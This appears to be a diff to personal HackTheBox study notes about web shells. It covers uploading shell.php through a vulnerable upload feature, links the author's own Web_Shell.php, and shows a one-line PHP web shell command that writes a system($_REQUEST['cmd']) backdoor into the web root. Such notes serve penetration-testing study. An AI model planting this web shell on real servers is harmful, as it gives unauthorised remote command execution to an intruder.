@@ -89,9 +89,10 @@
   Uploading the Shell:
     If an upload feature is vulnerable:
         We can upload shell.php to /var/www/html/ or equivalent.
-
+    We can also simply upload the shell file(i.e. in my case it's ![Web_Shell.php](https://github.com/en1gm4-exe/HackTheBox/blob/main/Notes%20/%20Shell%20/Web_Shell.php))
+ 
     If we already have RCE:
-
+      
       `echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php`
 
     Accessing Web Shell:
